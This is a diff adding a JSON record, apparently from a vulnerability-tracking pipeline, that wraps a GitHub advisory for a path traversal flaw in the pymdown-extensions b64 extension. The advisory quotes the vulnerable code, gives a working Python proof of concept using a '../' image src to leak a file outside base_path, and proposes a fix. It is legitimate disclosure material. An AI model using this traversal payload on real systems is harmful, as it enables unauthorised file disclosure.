@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/113433621?v=4\", \"events_url\": \"https://api.github.com/users/aqilFauzi121/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/aqilFauzi121/followers\", \"following_url\": \"https://api.github.com/users/aqilFauzi121/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/aqilFauzi121/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/aqilFauzi121\", \"id\": 113433621, \"login\": \"aqilFauzi121\", \"node_id\": \"U_kgDOBsLcFQ\", \"organizations_url\": \"https://api.github.com/users/aqilFauzi121/orgs\", \"received_events_url\": \"https://api.github.com/users/aqilFauzi121/received_events\", \"repos_url\": \"https://api.github.com/users/aqilFauzi121/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/aqilFauzi121/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/aqilFauzi121/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/aqilFauzi121\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-61632\", \"cvss\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}], \"description\": \"### Summary\\n\\nThe `b64` extension inlines images referenced by `<img src=\\\"...\\\">` as base64 data URIs. When resolving the `src` path it joins it onto the configured `base_path` with `os.path.normpath` and opens the result directly, with no check that the resolved path stays inside `base_path`. A `src` containing `../` sequences, or an absolute path, therefore reads a file outside `base_path` as long as that file has an allowed image extension (`.png`, `.jpg`, `.jpeg`, `.gif`, `.svg`). The base64 of that file is then embedded in the rendered output, disclosing its contents.\\n\\nThis is a separate code path from the `snippets` traversal issues (GHSA-jh85-wwv9-24hv, GHSA-62q4-447f-wv8h). It lives in `pymdownx/b64.py` and has no path restriction of any kind. Confirmed on `10.21.3` installed from PyPI.\\n\\n### Details\\n\\nIn `pymdownx/b64.py`, function `repl_path` (around lines 68 to 90 on `main`):\\n\\n```python\\nif is_absolute:\\n    file_name = os.path.normpath(path)                          # absolute src: base_path ignored entirely\\nelse:\\n    file_name = os.path.normpath(os.path.join(base_path, path)) # relative src: '../' escapes base_path\\nif os.path.exists(file_name):\\n    ext = os.path.splitext(file_name)[1].lower()\\n    for b64_ext in file_types:\\n        if ext in b64_ext:\\n            with open(file_name, \\\"rb\\\") as f:                    # opened with no containment check\\n                ...\\n```\\n\\nThere is no `startswith(base_path)`, no `os.path.realpath` comparison, and no rejection of `..`. Both branches are reachable from an attacker-controlled `src`.\\n\\n### PoC\\n\\nReproduced against an unmodified `pymdown-extensions==10.21.3` from PyPI. The script creates a `base_path` directory and a PNG one level above it, then renders Markdown whose image `src` points outside `base_path`, and confirms the outside file's bytes appear base64-encoded in the output.\\n\\n```python\\nimport base64, os, shutil, tempfile, markdown\\n\\nroot = tempfile.mkdtemp()\\nbase_path = os.path.join(root, \\\"docs\\\"); os.makedirs(base_path)\\noutside = os.path.join(root, \\\"secret\\\"); os.makedirs(outside)\\n\\npng = base64.b64decode(\\n    \\\"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk\\\"\\n    \\\"+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==\\\"\\n)\\nwith open(os.path.join(outside, \\\"secret.png\\\"), \\\"wb\\\") as f:\\n    f.write(png)\\n\\nmd = markdown.Markdown(\\n    extensions=[\\\"pymdownx.b64\\\"],\\n    extension_configs={\\\"pymdownx.b64\\\": {\\\"base_path\\\": base_path}},\\n)\\nhtml = md.convert('<img src=\\\"../secret/secret.png\\\">')\\n\\nassert base64.b64encode(png).decode() in html, \\\"not leaked\\\"\\nprint(\\\"LEAKED:\\\", html)\\n```\\n\\nOutput:\\n\\n```\\nLEAKED: <p><img src=\\\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQ...\\\"></p>\\n```\\n\\nThe base64 of a file outside `base_path` is present in the output. The absolute-path branch behaves the same way: an absolute `src` bypasses `base_path` entirely via `os.path.normpath(path)`. Both were confirmed leaking.\\n\\n### Impact\\n\\nAn application that renders untrusted Markdown with `pymdownx.b64` enabled exposes the contents of image-extension files on the server, or any path the process can read, to whoever controls the Markdown and whoever views the output. The reach is bounded by the image-extension check, so it is a targeted file read rather than full arbitrary read, but it still discloses file contents that were never meant to be exposed.\\n\\n### Suggested fix\\n\\nResolve the real path and require it to stay within `base_path` before opening:\\n\\n```python\\nfile_name = os.path.realpath(os.path.join(base_path, path))\\nbase_real = os.path.realpath(base_path)\\nif file_name != base_real and not file_name.startswith(base_real + os.sep):\\n    return m.group(0)  # leave the tag untouched; do not read outside base_path\\n```\\n\\nThe same containment check should apply to the absolute-path branch rather than trusting an absolute `src`. Using `realpath` instead of `abspath` also closes the related symlink-following gap in the snippets handler.\", \"ghsa_id\": \"GHSA-9xwg-3r6f-jcx2\", \"github_reviewed_at\": \"2026-07-24T16:18:33Z\", \"html_url\": \"https://github.com/advisories/GHSA-9xwg-3r6f-jcx2\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-9xwg-3r6f-jcx2\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-61632\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-24T16:18:33Z\", \"references\": [\"https://github.com/facelessuser/pymdown-extensions/security/advisories/GHSA-9xwg-3r6f-jcx2\", \"https://github.com/facelessuser/pymdown-extensions/commit/edce35586d11a1ef78bb187bc60497fe6dbf3b64\", \"https://github.com/facelessuser/pymdown-extensions/releases/tag/11.0\", \"https://github.com/advisories/GHSA-9xwg-3r6f-jcx2\"], \"repository_advisory_url\": \"https://api.github.com/repos/facelessuser/pymdown-extensions/security-advisories/GHSA-9xwg-3r6f-jcx2\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/facelessuser/pymdown-extensions\", \"summary\": \"PyMdown Extensions: Path traversal in the b64 extension lets <img src> read files outside base_path\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-24T16:18:34Z\", \"url\": \"https://api.github.com/advisories/GHSA-9xwg-3r6f-jcx2\", \"vulnerabilities\": [{\"first_patched_version\": \"11.0.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"pymdown-extensions\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 10.21.3\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-9xwg-3r6f-jcx2",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "pymdown-extensions: <= 10.21.3"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-61632"
+    ],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "pymdown-extensions"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-24T19:36:04.911315Z",
+  "provenance": {
+    "content_sha256": "b5333a8951c7b2af139514340f4e008a6314585805e934b74f6c725c9e6e70ad",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-24T16:18:33Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-9xwg-3r6f-jcx2",
+  "status": "active",
+  "title": "PyMdown Extensions: Path traversal in the b64 extension lets <img src> read files outside base_path",
+  "updated_at": "2026-07-24T16:18:34Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-9xwg-3r6f-jcx2"
+}
